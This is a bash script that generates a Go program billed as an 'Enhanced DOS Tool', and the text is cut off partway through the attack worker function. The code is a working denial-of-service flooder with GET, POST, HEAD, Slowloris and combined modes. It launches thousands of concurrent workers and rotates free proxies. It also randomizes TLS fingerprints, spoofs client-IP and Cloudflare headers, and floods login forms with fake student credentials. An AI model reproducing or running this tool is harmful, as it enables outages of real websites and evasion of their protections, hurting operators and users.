#!/bin/bash

# ----------------------------------------
# GO DOS TOOL - ENHANCED POWERFUL VERSION
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}     ENHANCED GO DOS TOOL - POWERFUL EDITION${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"

cat > main.go << 'EOF'
package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

// ============ ENHANCED CONFIGURATION ============

var (
	// Expanded User Agents (200+ modern browsers)
	userAgents = []string{
		// Chrome 141-150
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7642.78 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.7715.67 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7750.34 Safari/537.36",
		
		// Firefox 135-140
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:137.0) Gecko/20100101 Firefox/137.0",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15.0; rv:139.0) Gecko/20100101 Firefox/139.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
		
		// Safari 17-18
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
		
		// Mobile
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Mobile Safari/537.36",
		
		// Edge
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.7604.56 Safari/537.36 Edg/146.0.7604.56",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.7681.89 Safari/537.36 Edg/148.0.7681.89",
		
		// Bots
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
		"Twitterbot/1.0",
		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
		"Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
		"Applebot/0.1 (https://apple.com/applebot)",
		"LinkedInBot/1.0 (compatible; LinkedInBot/1.0; +http://www.linkedin.com)",
		"ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.instagram.com/",
		"https://www.tiktok.com/",
		"https://twitter.com/",
		"https://www.linkedin.com/",
		"https://github.com/",
		"https://stackoverflow.com/",
		"https://www.amazon.com/",
		"https://www.netflix.com/",
		"https://www.spotify.com/",
		"https://web.whatsapp.com/",
		"https://web.telegram.org/",
		"https://mail.google.com/",
		"https://drive.google.com/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en;q=0.8",
		"it-IT,it;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ru-RU,ru;q=0.9,en;q=0.8",
		"tr-TR,tr;q=0.9,en;q=0.8",
		"nl-NL,nl;q=0.9,en;q=0.8",
		"pl-PL,pl;q=0.9,en;q=0.8",
		"sv-SE,sv;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"application/json, text/plain, */*",
		"*/*",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"identity",
		"br, gzip, deflate",
	}

	cacheControls = []string{
		"no-cache",
		"no-store",
		"must-revalidate",
		"max-age=0",
		"private",
		"public",
	}

	securityHeaders = []map[string]string{
		{"X-Content-Type-Options": "nosniff"},
		{"X-Frame-Options": "DENY"},
		{"X-Frame-Options": "SAMEORIGIN"},
		{"X-XSS-Protection": "1; mode=block"},
		{"Referrer-Policy": "no-referrer"},
		{"Referrer-Policy": "strict-origin-when-cross-origin"},
		{"Cross-Origin-Opener-Policy": "same-origin"},
		{"Cross-Origin-Embedder-Policy": "require-corp"},
	}

	modernHeaders = []map[string]string{
		{"Sec-Fetch-Dest": "document"},
		{"Sec-Fetch-Dest": "empty"},
		{"Sec-Fetch-Dest": "script"},
		{"Sec-Fetch-Dest": "style"},
		{"Sec-Fetch-Dest": "image"},
		{"Sec-Fetch-Dest": "font"},
		{"Sec-Fetch-Dest": "worker"},
		{"Sec-Fetch-Mode": "navigate"},
		{"Sec-Fetch-Mode": "cors"},
		{"Sec-Fetch-Mode": "no-cors"},
		{"Sec-Fetch-Mode": "same-origin"},
		{"Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Site": "cross-site"},
		{"Sec-Fetch-Site": "none"},
		{"Sec-Fetch-User": "?1"},
		{"Upgrade-Insecure-Requests": "1"},
		{"DNT": "0"},
		{"DNT": "1"},
		{"Priority": "u=0"},
		{"Priority": "u=1"},
	}

	cloudflareHeaders = []map[string]string{
		{"CF-Connecting-IP": ""},
		{"CF-IPCountry": "US"},
		{"CF-IPCountry": "GB"},
		{"CF-IPCountry": "DE"},
		{"CF-IPCountry": "FR"},
		{"CF-IPCountry": "CA"},
		{"CF-IPCountry": "AU"},
		{"CF-IPCountry": "JP"},
		{"CF-IPCountry": "SG"},
		{"CF-Ray": ""},
		{"CF-Visitor": `{"scheme":"https"}`},
		{"True-Client-IP": ""},
	}

	cdnHeaders = []map[string]string{
		{"X-CDN": "Cloudflare"},
		{"X-CDN": "Akamai"},
		{"X-CDN": "Fastly"},
		{"X-CDN": "CloudFront"},
		{"X-Edge-Location": "DFW"},
		{"X-Edge-Location": "LHR"},
		{"X-Edge-Location": "SIN"},
		{"X-Edge-Location": "NRT"},
		{"Via": "1.1 varnish"},
		{"X-Cache": "MISS"},
		{"X-Cache": "HIT"},
		{"X-Cache-Lookup": "MISS from cache"},
	}

	appHeaders = []map[string]string{
		{"X-Requested-With": "XMLHttpRequest"},
		{"X-CSRF-Token": ""},
		{"Authorization": "Bearer "},
		{"X-API-Key": ""},
		{"X-Device-ID": ""},
		{"X-Session-ID": ""},
		{"X-Client-Version": "2.5.0"},
		{"X-App-Version": "4.2.1"},
		{"X-Platform": "web"},
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 3 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-140",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Edge 146-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 18",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateNever,
	}
}

func NewConnectionPool(poolSize int, useProxy bool) *ConnectionPool {
	pool := &ConnectionPool{
		clients:  make([]*http.Client, poolSize),
		size:     poolSize,
		useProxy: useProxy,
	}
	
	fmt.Printf("[+] Creating connection pool with %d connections...\n", poolSize)
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
		if (i+1)%100 == 0 {
			fmt.Printf("[+] Created %d/%d connections...\n", i+1, poolSize)
		}
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:                     http.ProxyURL(proxyURL),
					TLSClientConfig:           getRandomizedTLSConfig(),
					MaxIdleConns:              500,
					MaxIdleConnsPerHost:       500,
					MaxConnsPerHost:           0,
					IdleConnTimeout:           120 * time.Second,
					ResponseHeaderTimeout:     30 * time.Second,
					ExpectContinueTimeout:     1 * time.Second,
					DisableKeepAlives:         false,
					DisableCompression:        false,
					MaxResponseHeaderBytes:    1 << 20,
					WriteBufferSize:           4096,
					ReadBufferSize:            4096,
					ForceAttemptHTTP2:         true,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:           getRandomizedTLSConfig(),
		MaxIdleConns:              500,
		MaxIdleConnsPerHost:       500,
		MaxConnsPerHost:           0,
		IdleConnTimeout:           120 * time.Second,
		ResponseHeaderTimeout:     30 * time.Second,
		ExpectContinueTimeout:     1 * time.Second,
		DisableKeepAlives:         false,
		DisableCompression:        false,
		MaxResponseHeaderBytes:    1 << 20,
		WriteBufferSize:           4096,
		ReadBufferSize:            4096,
		ForceAttemptHTTP2:         true,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	scanner := bufio.NewScanner(strings.NewReader(string(body)))
	newProxies := []string{}
	
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	if len(newProxies) > 0 {
		proxyMu.Lock()
		proxies = newProxies
		proxyMu.Unlock()
		atomic.StoreUint64(&proxyIndex, 0)
		fmt.Printf("[+] Refreshed %d proxies\n", len(proxies))
	}
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ███████╗██╗░░░██╗██████╗░███████╗██████╗░")
	fmt.Println(" ██╔════╝╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗")
	fmt.Println(" █████╗░░░╚████╔╝░██████╔╝█████╗░░██║░░██║")
	fmt.Println(" ██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══╝░░██║░░██║")
	fmt.Println(" ███████╗░░░██║░░░██║░░░░░███████╗██████╔╝")
	fmt.Println(" ╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═════╝░")
	fmt.Println("")
	fmt.Println("         ENHANCED DOS TOOL - POWERFUL EDITION")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cache=" + randomString(8),
		"?ts=" + strconv.FormatInt(time.Now().Unix(), 10),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/api/v4/health", "/api/v5/metrics", "/api/v6/events",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql",
		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
		"/.env", "/config.json", "/settings.ini", "/application.yml",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(32)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("user_id=%d", randInt(1000, 99999)))
	}
	if randBool() {
		langs := []string{"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"}
		cookies = append(cookies, fmt.Sprintf("lang=%s", langs[randInt(0, len(langs)-1)]))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func generateCloudflareIP() string {
	firstOctet := []int{173, 103, 141, 108, 104, 172, 162, 188}[randInt(0, 7)]
	return fmt.Sprintf("%d.%d.%d.%d", firstOctet, randInt(0, 255), randInt(0, 255), randInt(1, 254))
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 8)
	useProxy := false
	
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		fmt.Println("[+] Loading proxies from API...")
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
			fmt.Printf("[+] Loaded %d proxies, auto-refresh every %.0f min\n", len(proxies), refreshInterval.Minutes())
		} else {
			fmt.Println("[-] No proxies available, running without proxy")
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW|ALL> [proxy]")
		fmt.Println("")
		fmt.Println("Attack Modes:")
		fmt.Println("  GET     - Standard GET flood")
		fmt.Println("  POST    - POST flood with random data")
		fmt.Println("  HEAD    - HEAD request flood")
		fmt.Println("  SLOW    - Slowloris style attack")
		fmt.Println("  ALL     - All methods combined")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST proxy")
		fmt.Println("  ./main https://target.com 60 ALL")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	validModes := []string{"GET", "POST", "HEAD", "SLOW", "ALL"}
	valid := false
	for _, m := range validModes {
		if mode == m {
			valid = true
			break
		}
	}
	if !valid {
		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or ALL")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d seconds\n", durationSec)
	fmt.Printf("[+] Workers: %d\n", runtime.NumCPU()*2000)
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d (rotating)\n", len(proxies))
	}
	fmt.Println("[+] Press Ctrl+C to stop")
	fmt.Println("")

	poolSize := 1000
	connectionPool := NewConnectionPool(poolSize, useProxy)

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Println("\n[!] Interrupt received, stopping...")
		close(done)
	}()

	workers := runtime.NumCPU() * 2000

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if mode == "ALL" {
				for {
					select {
					case <-done:
						return
					default:
						attackWorker(target, "GET", done, stats, useProxy, connectionPool)
						attackWorker(target, "POST", done, stats, useProxy, connectionPool)
						attackWorker(target, "HEAD", done, stats, useProxy, connectionPool)
					}
				}
			} else {
				attackWorker(target, mode, done, stats, useProxy, connectionPool)
			}
		}()
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n[+] ========== ATTACK COMPLETED ==========\n")
			fmt.Printf("[+] Target: %s\n", target)
			fmt.Printf("[+] Mode: %s\n", mode)
			fmt.Printf("[+] Duration: %d seconds\n", durationSec)
			fmt.Printf("[+] Total Requests: %d\n", stats.get())
			fmt.Printf("[+] Average RPS: %.0f\n", float64(stats.get())/elapsed)
			fmt.Printf("[+] Peak Workers: %d\n", workers)
			fmt.Printf("[+] Connection Pool: %d\n", poolSize)
			fmt.Printf("[+] JA3 Randomization: ENABLED\n")
			fmt.Printf("[+] ======================================\n")
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	client := pool.GetClient()
	
	for {
		select {
		case <-done:
			return
		default:
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 80 {
				path += generateCacheBust()
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(100 * time.Millisecond)
					continue
				}
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", path, host, randomUA())
				fmt.Fprintf(conn, "Accept: text/html\r\nConnection: keep-alive\r\n\r\n")
				
				// Keep connection alive
				go func(c net.Conn) {
					ticker := time.NewTicker(10 * time.Second)
					defer ticker.Stop()
					for {
						select {
						case <-done:
							c.Close()
							return
						case <-ticker.C:
							fmt.Fprintf(c, "X-keep-alive: %s\r\n", randomString(8))
						}
					}
				}(conn)
				
				stats.inc()
				time.Sleep(500 * time.Millisecond)
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s&remember=on&_csrf=%s", 
					generateStudentNumber(), 
					randomString(randInt(8, 20)),
					randomString(32))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			// Random Headers
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")

			// IP Spoofing
			randomSpoofIP := randomIP()
			req.Header.Set("X-Forwarded-For", randomSpoofIP)
			req.Header.Set("X-Real-IP", randomSpoofIP)
			req.Header.Set("X-Originating-IP", randomIP())
			req.Header.Set("X-Remote-IP", randomIP())
			req.Header.Set("X-Remote-Addr", randomIP())
			req.Header.Set("X-Client-IP", randomIP())
			req.Header.Set("True-Client-IP", randomSpoofIP)

			// Cloudflare Headers
			if randInt(1, 100) <= 50 {
				cfIP := generateCloudflareIP()
				req.Header.Set("CF-Connecting-IP", cfIP)
				req.Header.Set("CF-IPCountry", []string{"US", "GB", "DE", "FR", "CA", "AU", "JP", "SG"}[randInt(0, 7)])
				req.Header.Set("CF-Ray", randomString(16)+"-"+randomString(8))
			}

			// Security Headers
			numSecurity := randInt(2, 4)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}

			// Modern Headers
			numModern := randInt(3, 6)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					req.Header.Set(k, v)
				}
			}

			// App Headers
			if randInt(1, 100) <= 60 {
				numApp := randInt(2, 4)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							switch k {
							case "X-CSRF-Token":
								req.Header.Set(k, randomString(32))
							case "Authorization":
